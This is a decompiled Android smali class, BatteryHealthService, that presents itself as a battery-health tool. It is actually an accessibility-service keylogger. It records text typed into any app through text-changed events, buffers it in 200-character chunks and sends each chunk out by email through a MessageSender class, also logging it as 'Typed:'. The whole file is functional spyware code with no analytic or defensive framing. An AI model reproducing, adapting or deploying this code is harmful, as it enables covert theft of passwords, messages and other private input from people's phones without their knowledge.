.class public Lcom/BatteryHealth/BatteryHealthService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "BatteryHealthService.java"


# static fields
.field private static final TAG:Ljava/lang/String;


# instance fields
.field private final currentKeyEvents:Ljava/lang/StringBuilder;

.field private keyEventCount:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 14
    const-class v0, Lcom/BatteryHealth/BatteryHealthService;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/BatteryHealth/BatteryHealthService;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 13
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    .line 15
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iput-object v0, p0, Lcom/BatteryHealth/BatteryHealthService;->currentKeyEvents:Ljava/lang/StringBuilder;

    .line 16
    const/4 v0, 0x0

    iput v0, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventCount:I

    return-void
.end method

.method private countKeyEvents(Ljava/lang/String;)I
    .locals 1
    .param p1, "text"    # Ljava/lang/String;

    .line 45
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    return v0
.end method

.method static synthetic lambda$sendEmail$0(Ljava/lang/String;)V
    .locals 4
    .param p0, "log"    # Ljava/lang/String;

    .line 51
    :try_start_0
    new-instance v0, Lcom/BatteryHealth/MessageSender;

    invoke-direct {v0}, Lcom/BatteryHealth/MessageSender;-><init>()V

    invoke-virtual {v0, p0}, Lcom/BatteryHealth/MessageSender;->sendEmail(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    goto :goto_0

    .line 52
    :catch_0
    move-exception v0

    .line 53
    .local v0, "e":Ljava/lang/Exception;
    sget-object v1, Lcom/BatteryHealth/BatteryHealthService;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to send email: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method private sendEmail(Ljava/lang/String;)V
    .locals 2
    .param p1, "log"    # Ljava/lang/String;

    .line 49
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/BatteryHealth/BatteryHealthService$$ExternalSyntheticLambda0;

    invoke-direct {v1, p1}, Lcom/BatteryHealth/BatteryHealthService$$ExternalSyntheticLambda0;-><init>(Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 55
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 56
    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10
    .param p1, "event"    # Landroid/view/accessibility/AccessibilityEvent;

    .line 21
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v0

    const/16 v1, 0x10

    if-ne v0, v1, :cond_1

    .line 22
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    .line 23
    .local v0, "textList":Ljava/util/List;, "Ljava/util/List<Ljava/lang/CharSequence;>;"
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/CharSequence;

    .line 24
    .local v2, "text":Ljava/lang/CharSequence;
    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    .line 25
    .local v3, "newText":Ljava/lang/String;
    invoke-direct {p0, v3}, Lcom/BatteryHealth/BatteryHealthService;->countKeyEvents(Ljava/lang/String;)I

    move-result v4

    .line 27
    .local v4, "newKeyEventCount":I
    iget v5, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventCount:I

    if-le v4, v5, :cond_0

    .line 28
    iget-object v6, p0, Lcom/BatteryHealth/BatteryHealthService;->currentKeyEvents:Ljava/lang/StringBuilder;

    invoke-virtual {v3, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 30
    iget-object v5, p0, Lcom/BatteryHealth/BatteryHealthService;->currentKeyEvents:Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->length()I

    move-result v5

    const/16 v6, 0xc8

    if-lt v5, v6, :cond_0

    .line 31
    iget-object v5, p0, Lcom/BatteryHealth/BatteryHealthService;->currentKeyEvents:Ljava/lang/StringBuilder;

    const/4 v7, 0x0

    invoke-virtual {v5, v7, v6}, Ljava/lang/StringBuilder;->substring(II)Ljava/lang/String;

    move-result-object v5

    .line 32
    .local v5, "emailText":Ljava/lang/String;
    invoke-direct {p0, v5}, Lcom/BatteryHealth/BatteryHealthService;->sendEmail(Ljava/lang/String;)V

    .line 33
    sget-object v6, Lcom/BatteryHealth/BatteryHealthService;->TAG:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Typed: "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v6, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 34
    iget-object v6, p0, Lcom/BatteryHealth/BatteryHealthService;->currentKeyEvents:Ljava/lang/StringBuilder;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 38
    .end local v5    # "emailText":Ljava/lang/String;
    :cond_0
    iput v4, p0, Lcom/BatteryHealth/BatteryHealthService;->keyEventCount:I

    .line 39
    .end local v2    # "text":Ljava/lang/CharSequence;
    .end local v3    # "newText":Ljava/lang/String;
    .end local v4    # "newKeyEventCount":I
    goto :goto_0

    .line 41
    .end local v0    # "textList":Ljava/util/List;, "Ljava/util/List<Ljava/lang/CharSequence;>;"
    :cond_1
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    .line 61
    return-void
.end method

.method protected onServiceConnected()V
    .locals 2

    .line 65
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 66
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    .line 67
    .local v0, "info":Landroid/accessibilityservice/AccessibilityServiceInfo;
    const/4 v1, 0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    .line 68
    const/4 v1, -0x1

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    .line 69
    const/16 v1, 0x10

    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    .line 70
    invoke-virtual {p0, v0}, Lcom/BatteryHealth/BatteryHealthService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    .line 71
    return-void
.end method
